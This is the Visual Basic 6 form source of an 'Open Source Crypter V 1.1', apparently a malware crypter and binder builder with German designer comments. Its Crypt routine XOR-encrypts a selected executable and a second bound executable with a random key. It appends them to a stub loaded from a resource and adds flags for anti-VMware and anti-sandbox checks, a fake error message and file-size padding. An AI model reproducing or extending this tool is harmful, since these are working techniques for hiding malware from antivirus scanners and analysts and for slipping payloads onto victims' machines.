VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Open Source Crypter  V 1.1"
   ClientHeight    =   4200
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   5175
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MousePointer    =   1  'Pfeil
   ScaleHeight     =   4200
   ScaleWidth      =   5175
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.TextBox WICHTIG 
      Height          =   495
      Left            =   15000
      TabIndex        =   22
      Text            =   "Text6"
      Top             =   12600
      Width           =   735
   End
   Begin VB.CommandButton OPYRIGHT 
      Caption         =   "COPYYYYYYY"
      Height          =   855
      Left            =   16800
      TabIndex        =   21
      Top             =   12840
      Width           =   1695
   End
   Begin Projekt1.XP_Buttons Command4 
      Height          =   375
      Left            =   2640
      TabIndex        =   17
      Top             =   3720
      Width           =   2415
      _ExtentX        =   4260
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "Crypt"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   15724527
      BCOLO           =   15724527
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":57E2
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Projekt1.XP_Buttons XP_Buttons1 
      Height          =   375
      Left            =   120
      TabIndex        =   16
      Top             =   3720
      Width           =   2415
      _ExtentX        =   4260
      _ExtentY        =   661
      BTYPE           =   5
      TX              =   "Exit"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   1
      FOCUSR          =   -1  'True
      BCOL            =   15724527
      BCOLO           =   15724527
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":57FE
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Frame Frame6 
      Appearance      =   0  '2D
      Caption         =   "Options"
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   2640
      TabIndex        =   12
      Top             =   2640
      Width           =   2415
      Begin VB.CheckBox Check4 
         Caption         =   "Anti Sandbox"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   600
         Width           =   1455
      End
      Begin VB.CheckBox Check3 
         Caption         =   "Anti VMware"
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   240
         Width           =   1455
      End
   End
   Begin VB.Frame Frame5 
      Appearance      =   0  '2D
      Caption         =   "Exe-Pump"
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   120
      TabIndex        =   9
      Top             =   2640
      Width           =   2415
      Begin VB.TextBox Text5 
         Appearance      =   0  '2D
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   960
         TabIndex        =   11
         Top             =   600
         Width           =   1095
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   855
      End
      Begin VB.Label Label1 
         Caption         =   "Bytes :"
         Height          =   255
         Left            =   360
         TabIndex        =   15
         Top             =   600
         Width           =   615
      End
   End
   Begin VB.Frame Frame4 
      Appearance      =   0  '2D
      Caption         =   "Fake  Error"
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   2640
      TabIndex        =   6
      Top             =   1560
      Width           =   2415
      Begin VB.TextBox Text4 
         Appearance      =   0  '2D
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         TabIndex        =   8
         Text            =   "Nachricht...."
         Top             =   600
         Width           =   2175
      End
      Begin VB.CheckBox Check1 
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   240
         Width           =   855
      End
   End
   Begin VB.Frame Frame3 
      Appearance      =   0  '2D
      Caption         =   "Crypt-String"
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   120
      TabIndex        =   4
      Top             =   1560
      Width           =   2415
      Begin Projekt1.XP_Buttons command3 
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   600
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   450
         BTYPE           =   5
         TX              =   "Generate"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15724527
         BCOLO           =   15724527
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":581A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.TextBox Text3 
         Appearance      =   0  '2D
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         TabIndex        =   5
         Top             =   240
         Width           =   2175
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  '2D
      Caption         =   "Binder"
      ForeColor       =   &H80000008&
      Height          =   615
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   4935
      Begin Projekt1.XP_Buttons Command2 
         Height          =   255
         Left            =   4200
         TabIndex        =   19
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   450
         BTYPE           =   5
         TX              =   "..."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15724527
         BCOLO           =   15724527
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":5836
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  '2D
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   3975
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  '2D
      Caption         =   "File:"
      ForeColor       =   &H80000008&
      Height          =   615
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4935
      Begin Projekt1.XP_Buttons Command1 
         Height          =   255
         Left            =   4200
         TabIndex        =   20
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   450
         BTYPE           =   5
         TX              =   "..."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15724527
         BCOLO           =   15724527
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":5852
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  '2D
         BackColor       =   &H8000000F&
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   3975
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Sub ExitProcess Lib "kernel32.dll" (ByVal uExitCode As Long)
Private Declare Function InitCommonControls Lib "comctl32.dll" () As Long

Private Function AppPath(ByVal zPath As String) As String
  If Right$(zPath, 1) = "\" Then AppPath = zPath Else AppPath = zPath & "\"
End Function

Private Function FileExist(ByVal strPath As String) As Boolean
  On Local Error GoTo ErrFile
  Open strPath For Input Access Read As #1
  Close #1
  FileExist = True
  Exit Function
ErrFile:
  FileExist = False
End Function

Private Sub MakeManifest()
  Dim file$, file2$, qwe As String
  file$ = AppPath(App.Path) & App.EXEName & ".exe.MANIFEST"
  If Not FileExist(file$) Then
    qwe = "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>" & vbCrLf _
        & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">" & vbCrLf _
        & "<assemblyIdentity type=""win32"" processorArchitecture=""*"" version=""6.0.0.0"" name=""name""/>" & vbCrLf _
        & "<description>Enter your Description Here</description>" & vbCrLf _
        & "<dependency>" & vbCrLf _
        & "   <dependentAssembly>" & vbCrLf _
        & "      <assemblyIdentity" & vbCrLf _
        & "           type=""win32""" & vbCrLf _
        & "           name=""Microsoft.Windows.Common-Controls"" version=""6.0.0.0""" & vbCrLf _
        & "           language=""*""" & vbCrLf _
        & "           processorArchitecture=""*""" & vbCrLf _
        & "         publicKeyToken=""6595b64144ccf1df""" & vbCrLf _
        & "      />" & vbCrLf _
        & "   </dependentAssembly>" & vbCrLf _
        & "</dependency>" & vbCrLf _
        & "</assembly>" & vbCrLf
    Open file$ For Binary Access Write Lock Write As #1 Len = 1
    Put #1, , qwe
    Close #1
    SetAttr file$, vbReadOnly Or vbHidden
    file2$ = AppPath(App.Path) & App.EXEName & ".exe"
    Shell file2$, vbNormalFocus
    ExitProcess 1
  End If
End Sub

Public Sub InitControlsXP()
  MakeManifest
  InitCommonControls
End Sub


Private Sub Command1_Click()
 Dim pe As String
   pe = GetOpenFileNameDLG(".exe|*.exe", "Select file to crypt", "", Me.hwnd)
    If pe <> "" Then
        Text1.Text = pe
    End If
End Sub

Private Sub Command2_Click()
 Dim pe As String
   pe = GetOpenFileNameDLG("*.exe|*.exe", "Select file to crypt", "", Me.hwnd)
    If pe <> "" Then
        Text2.Text = pe
    End If
End Sub

Private Sub Command3_Click()
   Dim tz As Integer, rt
    
   
    For i = 1 To 20
        rt = rt & Mid("12.-3456789(abcde<fghi|jklm>nopqr(*stuvwx§yz" & Date & Time & Time & Time & Time & Time & Time & Time & Time, Int((Rnd * Len("12.-3456789(abcde<fghi|jklm>nopqr(*stuvwx§yz" & Date & Time & Time & Time & Time & Time & Time & Time & Time)) + 1), 1)
    Next i
  
    Text3.Text = rt

End Sub




Private Sub Command4_Click()
 On Error Resume Next
 Dim tt As String
 Dim binder As String
 Dim pe1 As String
 Dim pe As String
 Dim pe2 As String
 Dim pe3 As String
 Dim pe4 As String
 Dim pe5() As Byte
 
 pe5() = LoadResData(101, "CUSTOM")
 
 
 
 
   tt = GetSaveFileNameDLG(".exe|*.EXE", "Select file to crypt", "", Me.hwnd)
    If tt <> "" Then
     End If
     
     
     
     
Open Text1.Text For Binary As #1
pe1 = Space(LOF(1))
Get #1, , pe1
Close #1


Open Text2.Text For Binary As #1
pe2 = Space(LOF(1))
Get #1, , pe2
Close #1

pe3 = XOR3(pe2, Text3.Text)
pe = XOR3(pe1, Text3.Text)


If Check1.Value = 1 Then
Dim msg As String
msg = Text4.Text
End If

If Check3.Value = 1 Then
Dim vm As String
vm = "TRUE"
End If

If Check4.Value = 1 Then
Dim sand As String
sand = "TRUE"
End If

Open tt For Binary As #1
Put #1, , pe5()
Put #1, , "^^^^"
Put #1, , pe3
Put #1, , "^^^^"
Put #1, , pe
Put #1, , "^^^^"
Put #1, , Text3.Text
Put #1, , "^^^^"
Put #1, , vm
Put #1, , "^^^^"
Put #1, , sand
Put #1, , "^^^^"
Put #1, , msg
Put #1, , "^^^^"
Close #1

If Check2.Value = 1 Then
Dim pump As String * 700
For t = 1 To Text5.Text
Open tt For Append As #1
Print #1, LOF(1), pump
Close #1
Next t

End If
     
End Sub

Private Sub Form_Initialize()

  InitControlsXP
   Dim tz As Integer, rt
    
   
    For i = 1 To 20
        rt = rt & Mid("12.-3456789(abcde<fghi|jklm>nopqr(*stuvwx§yz" & Date & Time & Time & Time & Time & Time & Time & Time & Time, Int((Rnd * Len("12.-3456789(abcde<fghi|jklm>nopqr(*stuvwx§yz" & Date & Time & Time & Time & Time & Time & Time & Time & Time)) + 1), 1)
    Next i
  
    Text3.Text = rt
End Sub

Private Sub XP_Buttons1_Click()
End
End Sub
